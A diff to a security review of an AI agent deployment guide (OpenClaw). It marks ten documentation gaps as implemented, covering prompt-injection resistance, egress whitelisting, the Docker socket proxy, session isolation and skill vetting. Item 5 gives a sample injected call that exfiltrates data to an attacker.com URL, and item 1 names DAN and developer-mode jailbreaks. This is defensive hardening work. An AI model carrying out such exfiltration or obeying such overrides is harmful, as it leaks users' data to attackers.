@@ -974,14 +974,16 @@ This is **outbound phone calling** — well outside what most "AI assistant" dep
 
 ⚡ **Things the documentation doesn't say that you'd wish it had.**
 
-### 1. The "Minimal Viable SOUL.md" Problem
+> ✅ All items below have been implemented in `README.md`.
+
+### 1. ✅ The "Minimal Viable SOUL.md" Problem
 
 The provided SOUL.md template is a starting point, not a production security control. The docs don't explain:
 - How model capability affects SOUL.md effectiveness (Haiku < Sonnet < Opus in injection resistance)
 - That SOUL.md should be tested adversarially before deployment
 - That common attacks (DAN, role-play overrides, developer mode prompts) should be specifically addressed
 
-### 2. LanceDB Has No Size Limit Documentation
+### 2. ✅ LanceDB Has No Size Limit Documentation
 
 OpenClaw uses LanceDB embedded vector storage. There's no documented:
 - Maximum efficient size
@@ -991,11 +993,11 @@ OpenClaw uses LanceDB embedded vector storage. There's no documented:
 
 An active agent accumulating memories for months will eventually have a large, potentially fragmented index. The `openclaw memory index` command likely handles compaction, but there's no guidance on when to run it proactively.
 
-### 3. The `openclaw security audit --deep` Output is Unspecified
+### 3. ✅ The `openclaw security audit --deep` Output is Unspecified
 
 The deployment guide runs `openclaw security audit --deep` at multiple points but never shows what a "passing" audit output looks like. Users have no baseline to compare against. This makes it impossible to know if a warning in the output is expected or a real problem.
 
-### 4. Token Budget Monitoring Should Be Automated
+### 4. ✅ Token Budget Monitoring Should Be Automated
 
 The docs show how to manually check `openclaw usage cost` and LiteLLM `/spend/logs`. But there's no alerting:
 - No watchdog check for approaching budget caps
@@ -1009,11 +1011,11 @@ spend=$(docker exec openclaw wget -qO- http://openclaw-litellm:4000/spend/logs |
 if [ "$spend_pct" -gt 80 ]; then alert "LiteLLM spend at ${spend_pct}% of budget"; fi
 ```
 
-### 5. The Egress Whitelist is the Primary Data Exfiltration Control — And It's Documented as a Cost Control
+### 5. ✅ The Egress Whitelist is the Primary Data Exfiltration Control — And It's Documented as a Cost Control
 
 The Squid egress proxy is presented primarily as a "LLM provider whitelist" but it's actually the most important data exfiltration prevention control. If an attacker successfully achieves prompt injection and gets the agent to call `web_fetch("https://attacker.com/?data=<sensitive>")`, Squid blocks it because `attacker.com` isn't whitelisted. This deserves more prominent security framing.
 
-### 6. The Docker Socket Proxy is the Blast Radius Limiter
+### 6. ✅ The Docker Socket Proxy is the Blast Radius Limiter
 
 If someone escapes the sandbox and reaches the Docker API, they can only:
 - `EXEC` into existing containers
@@ -1029,7 +1031,7 @@ They **cannot**:
 
 The socket proxy effectively limits a Docker API escape to "can exec into containers that already exist" — still bad, but vastly better than full Docker socket access which would allow spinning up a privileged container with host mounts.
 
-### 7. `session.dmScope = "per-channel-peer"` Is Not Encrypted Isolation
+### 7. ✅ `session.dmScope = "per-channel-peer"` Is Not Encrypted Isolation
 
 Session scoping means separate conversation history and memory context per user. It does **not** mean:
 - Separate encryption at rest
@@ -1038,7 +1040,7 @@ Session scoping means separate conversation history and memory context per user.
 
 All user sessions run in the same `openclaw` process with the same LanceDB volume. A bug in OpenClaw that allows cross-session data access would expose all users' data. For true multi-tenant isolation, use separate OpenClaw instances (one per tenant).
 
-### 8. The Warm Standby Doesn't Actually Stay Warm
+### 8. ✅ The Warm Standby Doesn't Actually Stay Warm
 
 The "warm standby" in Step 13.9 is a pre-provisioned server with Docker installed and images pulled. But:
 - It doesn't run OpenClaw in read-only replica mode
@@ -1047,7 +1049,7 @@ The "warm standby" in Step 13.9 is a pre-provisioned server with Docker installe
 
 The name "warm standby" slightly overstates it. It's really a "pre-staged cold recovery environment" — faster than starting from scratch, but not the operational warm standby that most people expect from that term (which would involve continuous replication and near-zero RPO).
 
-### 9. ClawHub Skills Have No Security Audit Process (Documented)
+### 9. ✅ ClawHub Skills Have No Security Audit Process (Documented)
 
 The docs treat skills as "install if you need them" without discussing:
 - How skills are vetted
@@ -1057,7 +1059,7 @@ The docs treat skills as "install if you need them" without discussing:
 
 This is a significant gap. A malicious ClawHub skill could be the equivalent of a malicious npm package — and the `plugins.allow = []` default (blocking all skills) is the only protection.
 
-### 10. The x402 Payment System Makes the Threat Model Harder
+### 10. ✅ The x402 Payment System Makes the Threat Model Harder
 
 If an agent has x402 payment capability, the egress whitelist needs to include payment provider endpoints. This creates tension:
 - Whitelisting payment providers = potential for unauthorized payments
